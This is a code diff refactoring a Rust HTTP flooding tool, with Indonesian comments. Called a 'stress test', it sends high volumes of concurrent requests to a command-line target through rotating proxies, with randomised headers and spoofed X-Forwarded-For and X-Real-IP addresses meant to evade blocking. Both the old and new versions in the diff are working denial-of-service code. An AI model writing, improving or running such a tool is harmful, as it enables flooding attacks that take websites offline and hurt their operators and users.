@@ -1,188 +1,132 @@
-use std::{env, fs, sync::Arc, time::{Duration, Instant}};
-use rand::{seq::SliceRandom, Rng};
-use reqwest::{Client, Proxy};
+mod lib;
+use lib::{ConfigLists, pick_random, random_ip};
+use std::{env, sync::Arc, time::{Duration, Instant}};
+use reqwest::{Client, Proxy, header::HeaderMap};
 use tokio::sync::Semaphore;
 use futures::stream::{FuturesUnordered, StreamExt};
-
-// Load file into a Vec<String>
-fn load_file(filename: &str) -> Vec<String> {
-    fs::read_to_string(filename)
-        .unwrap_or_default()
-        .lines()
-        .map(|line| line.trim().to_string())
-        .filter(|line| !line.is_empty())
-        .collect()
-}
-
-// Generate random IP address for spoofing
-fn random_ip() -> String {
-    let mut rng = rand::thread_rng();
-    format!(
-        "{}.{}.{}.{}",
-        rng.gen_range(1..255),
-        rng.gen_range(0..255),
-        rng.gen_range(0..255),
-        rng.gen_range(1..255)
-    )
-}
-
-// HTTP stress testing function
-async fn http_stress(
-    url_target: String,
-    duration_sec: u64,
-    rps: usize,
-    concurrency: usize,
-    proxies: Arc<Vec<String>>,
-    referers: Arc<Vec<String>>,
-    user_agents: Arc<Vec<String>>,
-    paths: Arc<Vec<String>>,
-    ciphers: Arc<Vec<String>>,
-    sigalgs: Arc<Vec<String>>,
-    lang_header: Arc<Vec<String>>,
-    accept_header: Arc<Vec<String>>,
-    encoding_header: Arc<Vec<String>>,
-    controle_header: Arc<Vec<String>>,
-) {
-    let client = Arc::new(
-        Client::builder()
-            .pool_idle_timeout(Duration::from_secs(120))
-            .danger_accept_invalid_certs(true)
-            .http2_prior_knowledge()
-            .build()
-            .unwrap(),
-    );
-
-    let semaphore = Arc::new(Semaphore::new(concurrency));
-    let start = Instant::now();
-
-    let mut handles = Vec::with_capacity(concurrency);
-
-    let rps_per_thread = rps / concurrency.max(1);
-
-    for _ in 0..concurrency {
-        let client = Arc::clone(&client);
-        let semaphore = Arc::clone(&semaphore);
-        let proxies = Arc::clone(&proxies);
-        let referers = Arc::clone(&referers);
-        let user_agents = Arc::clone(&user_agents);
-        let paths = Arc::clone(&paths);
-        let ciphers = Arc::clone(&ciphers);
-        let sigalgs = Arc::clone(&sigalgs);
-        let lang_header = Arc::clone(&lang_header);
-        let accept_header = Arc::clone(&accept_header);
-        let encoding_header = Arc::clone(&encoding_header);
-        let controle_header = Arc::clone(&controle_header);
-        let url_target = url_target.clone();
-
-        handles.push(tokio::spawn(async move {
-            let _permit = semaphore.acquire().await.unwrap();
-            let mut rng = rand::thread_rng();
-
-            while start.elapsed().as_secs() < duration_sec {
-                let mut batch = FuturesUnordered::new();
-                for _ in 0..rps_per_thread.max(1) {
-                    let path = paths.choose(&mut rng).unwrap_or(&"/".to_string());
-                    let url = format!("{}{}", url_target, path);
-                    let user_agent = user_agents.choose(&mut rng).unwrap_or(&"Mozilla/5.0".to_string());
-                    let referer = referers.choose(&mut rng).unwrap_or(&"https://google.com".to_string());
-                    let cipher = ciphers.choose(&mut rng).unwrap_or(&"TLS_AES_128_GCM_SHA256".to_string());
-                    let sigalg = sigalgs.choose(&mut rng).unwrap_or(&"ecdsa_secp256r1_sha256".to_string());
-                    let lang = lang_header.choose(&mut rng).unwrap_or(&"en-US,en;q=0.5".to_string());
-                    let accept = accept_header.choose(&mut rng).unwrap_or(&"text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8".to_string());
-                    let encoding = encoding_header.choose(&mut rng).unwrap_or(&"gzip, deflate, br".to_string());
-                    let controle = controle_header.choose(&mut rng).unwrap_or(&"no-cache".to_string());
-
-                    let client = if !proxies.is_empty() {
-                        let proxy = proxies.choose(&mut rng).unwrap();
-                        Arc::new(
-                            Client::builder()
-                                .danger_accept_invalid_certs(true)
-                                .http2_prior_knowledge()
-                                .proxy(Proxy::all(proxy).unwrap())
-                                .build()
-                                .unwrap(),
-                        )
-                    } else {
-                        Arc::clone(&client)
-                    };
-
-                    let fake_ip = random_ip();
-                    let mut req = client
-                        .get(&url)
-                        .timeout(Duration::from_secs(4))
-                        .header("User-Agent", user_agent)
-                        .header("Referer", referer)
-                        .header("X-Forwarded-For", &fake_ip)
-                        .header("X-Real-IP", &fake_ip)
-                        .header("Accept", accept)
-                        .header("Accept-Encoding", encoding)
-                        .header("Accept-Language", lang)
-                        .header("Cache-Control", controle)
-                        .header("TLS-Cipher", cipher)
-                        .header("TLS-SigAlg", sigalg);
-
-                    batch.push(req.send());
-                }
-                while let Some(res) = batch.next().await {
-                    match res {
-                        Ok(_) => continue,
-                        Err(_) => continue,
-                    };
-                }
-            }
-        }));
-    }
-    futures::future::join_all(handles).await;
-    println!("[HTTP] DONE! Stress test selesai untuk target: {}", url_target);
-}
 
 #[tokio::main]
 async fn main() {
     let args: Vec<String> = env::args().collect();
     if args.len() < 5 {
-        eprintln!("Usage: {} [rps] threads proxies.txt [link web aku]", args[0]);
+        eprintln!("Usage: {} [rps] [threads] [proxies.txt] [target]", args[0]);
         std::process::exit(1);
     }
-
-    let rps: usize = args[1].parse().unwrap();
-    let threads: usize = args[2].parse().unwrap();
+    let rps: usize = args[1].parse().expect("Invalid RPS");
+    let threads: usize = args[2].parse().expect("Invalid thread count");
     let proxyfile = &args[3];
-    let http_target = &args[4];
+    let target = &args[4];
     let duration_sec = 30;
 
-    let proxies = Arc::new(load_file(proxyfile));
-    let referers = Arc::new(load_file("referers.txt"));
-    let user_agents = Arc::new(load_file("useragents.txt"));
-    let paths = Arc::new(load_file("paths.txt"));
-    let ciphers = Arc::new(load_file("ciphers.txt"));
-    let sigalgs = Arc::new(load_file("sigalgs.txt"));
-    let lang_header = Arc::new(load_file("lang_header.txt"));
-    let accept_header = Arc::new(load_file("accept_header.txt"));
-    let encoding_header = Arc::new(load_file("encoding_header.txt"));
-    let controle_header = Arc::new(load_file("controle_header.txt"));
+    // Load semua config eksternal
+    let mut config = ConfigLists::load();
+    config.proxies = Arc::new(lib::load_file(proxyfile)); // override dengan file argumen jika berbeda
 
-    println!("Proxies loaded: {} entries", proxies.len());
-    println!("Referers loaded: {} entries", referers.len());
-    println!("User Agents loaded: {} entries", user_agents.len());
-    println!("Paths loaded: {} entries", paths.len());
-    println!("Target: {http_target}, RPS: {rps}, Threads: {threads}, Duration: {duration_sec}s");
+    println!("Target: {target}\nRPS: {rps}, Threads: {threads}, Duration: {duration_sec}s");
+    println!("Proxies: {}, Useragents: {}, Referers: {}, Paths: {}",
+        config.proxies.len(), config.useragents.len(), config.referers.len(), config.paths.len()
+    );
 
-    http_stress(
-        http_target.to_string(),
-        duration_sec,
-        rps,
-        threads,
-        proxies,
-        referers,
-        user_agents,
-        paths,
-        ciphers,
-        sigalgs,
-        lang_header,
-        accept_header,
-        encoding_header,
-        controle_header,
-    )
-    .await;
+    let client_base = Arc::new(
+        Client::builder()
+            .pool_idle_timeout(Duration::from_secs(60))
+            .danger_accept_invalid_certs(true)
+            .tcp_nodelay(true)
+            .build()
+            .unwrap()
+    );
+    let semaphore = Arc::new(Semaphore::new(threads));
+    let start = Instant::now();
+
+    // Spawn threads
+    let mut handles = Vec::with_capacity(threads);
+    for _ in 0..threads {
+        let config = ConfigLists {
+            proxies: Arc::clone(&config.proxies),
+            referers: Arc::clone(&config.referers),
+            useragents: Arc::clone(&config.useragents),
+            ciphers: Arc::clone(&config.ciphers),
+            sigalgs: Arc::clone(&config.sigalgs),
+            paths: Arc::clone(&config.paths),
+            langs: Arc::clone(&config.langs),
+            accepts: Arc::clone(&config.accepts),
+            encodings: Arc::clone(&config.encodings),
+            controles: Arc::clone(&config.controles),
+        };
+        let target = target.to_string();
+        let client_base = Arc::clone(&client_base);
+        let semaphore = Arc::clone(&semaphore);
+
+        handles.push(tokio::spawn(async move {
+            let _permit = semaphore.acquire().await.unwrap();
+            let mut rng = rand::thread_rng();
+            let rps_per_thread = rps / threads.max(1);
+
+            while start.elapsed().as_secs() < duration_sec {
+                let mut batch = FuturesUnordered::new();
+
+                for _ in 0..rps_per_thread.max(1) {
+                    // Pilih proxy / client
+                    let client = if !config.proxies.is_empty() {
+                        let proxy = pick_random(&config.proxies, "");
+                        if !proxy.is_empty() {
+                            Arc::new(
+                                Client::builder()
+                                    .danger_accept_invalid_certs(true)
+                                    .proxy(Proxy::all(proxy).unwrap())
+                                    .build()
+                                    .unwrap()
+                            )
+                        } else { Arc::clone(&client_base) }
+                    } else { Arc::clone(&client_base) };
+
+                    // Randomisasi semua header
+                    let path = pick_random(&config.paths, "/");
+                    let url = format!("{}{}", target, path);
+                    let user_agent = pick_random(&config.useragents, "Mozilla/5.0");
+                    let referer = pick_random(&config.referers, "https://google.com");
+                    let cipher = pick_random(&config.ciphers, "TLS_AES_128_GCM_SHA256");
+                    let sigalg = pick_random(&config.sigalgs, "ecdsa_secp256r1_sha256");
+                    let lang = pick_random(&config.langs, "en-US,en;q=0.5");
+                    let accept = pick_random(&config.accepts, "*/*");
+                    let encoding = pick_random(&config.encodings, "gzip, deflate, br");
+                    let controle = pick_random(&config.controles, "no-cache");
+                    let fake_ip = random_ip();
+
+                    let mut headers = HeaderMap::new();
+                    headers.insert("User-Agent", user_agent.parse().unwrap());
+                    headers.insert("Referer", referer.parse().unwrap());
+                    headers.insert("X-Forwarded-For", fake_ip.parse().unwrap());
+                    headers.insert("X-Real-IP", fake_ip.parse().unwrap());
+                    headers.insert("Accept", accept.parse().unwrap());
+                    headers.insert("Accept-Encoding", encoding.parse().unwrap());
+                    headers.insert("Accept-Language", lang.parse().unwrap());
+                    headers.insert("Cache-Control", controle.parse().unwrap());
+                    headers.insert("TLS-Cipher", cipher.parse().unwrap());
+                    headers.insert("TLS-SigAlg", sigalg.parse().unwrap());
+
+                    let req = client
+                        .get(&url)
+                        .headers(headers)
+                        .timeout(Duration::from_secs(4));
+                    batch.push(req.send());
+                }
+                let mut ok = 0;
+                let mut fail = 0;
+                while let Some(res) = batch.next().await {
+                    match res {
+                        Ok(_) => ok += 1,
+                        Err(_) => fail += 1,
+                    }
+                }
+                // Optional: log per batch (bisa dihapus jika tidak mau noisy)
+                // println!("Batch done: OK: {}, Fail: {}", ok, fail);
+            }
+        }));
+    }
+    // Tunggu semua selesai
+    for h in handles {
+        let _ = h.await;
+    }
     println!("SELESAI!");
 }
